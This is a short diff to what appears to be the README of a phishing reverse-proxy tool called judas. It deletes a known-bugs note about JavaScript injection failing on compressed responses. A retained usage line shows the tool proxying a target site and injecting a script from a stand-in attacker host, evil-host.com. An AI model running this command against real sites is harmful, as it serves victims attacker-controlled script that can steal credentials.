@@ -43,7 +43,3 @@ Example:
 ```
 ./judas --target https://target-url.com --cert server.crt --private-key server.key --inject-js https://evil-host.com/payload.js
 ```
-
-Known Bugs
-----------
-+ Javascript injection fails when the target server compresses responses.
